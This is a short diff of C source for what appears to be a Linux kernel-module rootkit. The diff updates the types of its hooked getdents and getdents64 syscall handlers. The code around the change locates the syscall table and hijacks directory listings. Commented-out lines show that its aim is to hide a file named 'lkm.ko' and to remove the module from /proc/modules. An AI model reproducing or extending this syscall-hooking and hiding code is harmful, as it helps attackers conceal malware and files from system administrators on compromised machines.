@@ -93,12 +93,12 @@ struct linux_dirent {
     char            d_name[1];
 };
 
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+asmlinkage long new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
     char *buf[count];
-    int /*bpos,*/nread;
+    long /*bpos,*/nread;
     //struct file *fileh;
     //struct linux_dirent *d,*nd;
     //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
@@ -124,9 +124,9 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
     return nread; //and return so the user process can use the getdents
 }
 
-asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+asmlinkage long new_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
     char *buf[count];
-    int /*bpos,*/nread;
+    long /*bpos,*/nread;
     //struct linux_dirent64 *d,*nd;
     //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents64)(fd,dirp,count); //call the original function to get struct to manipulate
@@ -150,7 +150,7 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
 
 
 static int init(void) { //initial function, sets up syscall hijacking
-    //struct module *myself = &__this_module; //hide gcc warning
+    //struct module *myself = &__this_module; //commented to hide gcc warning
     //list_del(&myself->list); //remove from places such as /proc/modules
 	syscall_table = (address *)find(); //give us the syscall table (defined above find())
     if (!syscall_table) {cleanup_module(); } //if find() fails, unload
